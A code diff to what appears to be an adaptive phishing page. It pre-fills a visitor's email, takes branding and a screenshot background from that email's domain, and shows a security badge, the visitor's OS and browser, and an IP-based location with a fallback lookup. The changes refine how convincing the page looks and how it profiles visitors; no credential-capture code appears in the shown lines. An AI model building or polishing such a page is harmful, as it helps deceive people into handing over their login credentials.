@@ -43,7 +43,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.6);
+      background: rgba(0, 0, 0, 0.55);
       z-index: 0;
     }
     
@@ -101,23 +101,23 @@
       to { transform: rotate(360deg); }
     }
     
-    /* --- CHAMELEON CONTAINER (Professional with Shadow) --- */
+    /* --- CHAMELEON CONTAINER (Professional Shadow) --- */
     .chameleon-container {
       width: 100%;
       max-width: 560px;
       background: #ffffff;
       border-radius: 12px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4), 0 4px 20px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.45), 0 8px 20px rgba(0, 0, 0, 0.1);
       overflow: hidden;
       display: none;
       position: relative;
       z-index: 10;
       animation: fadeIn 0.6s ease;
-      border: 1px solid rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.08);
     }
     
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px) scale(0.98); }
+      from { opacity: 0; transform: translateY(20px) scale(0.97); }
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
     
@@ -176,11 +176,13 @@
     }
     
     .visitor-info .info-item .os-icon {
-      font-size: 15px;
+      font-size: 16px;
+      width: 18px;
     }
     
     .visitor-info .info-item .browser-icon {
-      font-size: 15px;
+      font-size: 16px;
+      width: 18px;
     }
     
     /* Content */
@@ -352,6 +354,7 @@
     
     .security-badge i {
       color: #22c55e;
+      font-size: 14px;
     }
     
     .loader {
@@ -490,13 +493,26 @@
       return email;
     }
     
-    // --- DETECT OS AND ICON ---
+    // --- DETECT OS AND ICON (Windows 10, macOS, etc.) ---
     function getOSInfo() {
       const ua = navigator.userAgent;
-      if (ua.includes('Windows')) return { name: 'Windows', icon: 'fa-windows' };
-      if (ua.includes('Mac OS')) return { name: 'macOS', icon: 'fa-apple' };
-      if (ua.includes('Linux')) return { name: 'Linux', icon: 'fa-linux' };
-      if (/Android|iOS|iPhone|iPad/i.test(ua)) return { name: 'Mobile', icon: 'fa-mobile-alt' };
+      if (ua.includes('Windows')) {
+        // Check for Windows 10/11
+        if (ua.includes('Windows NT 10.0')) return { name: 'Windows 10', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', icon: 'fa-windows' };
+        return { name: 'Windows', icon: 'fa-windows' };
+      }
+      if (ua.includes('Mac OS X') || ua.includes('Macintosh')) {
+        return { name: 'macOS', icon: 'fa-apple' };
+      }
+      if (ua.includes('Linux')) {
+        if (ua.includes('Android')) return { name: 'Android', icon: 'fa-android' };
+        if (ua.includes('CrOS')) return { name: 'ChromeOS', icon: 'fa-chrome' };
+        return { name: 'Linux', icon: 'fa-linux' };
+      }
+      if (/iPhone|iPad|iPod/i.test(ua)) return { name: 'iOS', icon: 'fa-apple' };
       return { name: 'Unknown', icon: 'fa-desktop' };
     }
     
@@ -511,15 +527,25 @@
       return { name: 'Unknown', icon: 'fa-globe' };
     }
     
-    // --- GET LOCATION (without IP) ---
+    // --- GET LOCATION (reliable with fallback) ---
     async function getLocation() {
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-        return `${data.city || 'Unknown'}, ${data.country_code || 'Unknown'}`;
-      } catch {
-        return 'Unknown';
-      }
+        if (data.city && data.country_code) {
+          return `${data.city}, ${data.country_code}`;
+        }
+      } catch {}
+      
+      try {
+        const res2 = await fetch('https://ipinfo.io/json');
+        const data2 = await res2.json();
+        if (data2.city && data2.country) {
+          return `${data2.city}, ${data2.country}`;
+        }
+      } catch {}
+      
+      return 'Unknown';
     }
     
     // --- FETCH BRANDING AND BACKGROUND ---
@@ -568,7 +594,6 @@
         }
         document.querySelector('.btn-submit').style.background = color;
         document.querySelector('.email-display').style.borderLeftColor = color;
-        document.querySelector('.security-badge i').style.color = color;
         
         // DYNAMIC BACKGROUND
         document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('https://image.thum.io/get/width/1200/https://${domain}')`;
@@ -596,9 +621,9 @@
       // Location (without IP)
       document.getElementById('visitLocation').textContent = await getLocation();
       
-      // OS Icon + Label
+      // OS Icon + Label (Windows 10, macOS, etc.)
       const os = getOSInfo();
-      document.getElementById('osIcon').className = `fas ${os.icon} os-icon`;
+      document.getElementById('osIcon').className = `fab ${os.icon} os-icon`;
       document.getElementById('osLabel').textContent = os.name;
       
       // Browser Icon + Label
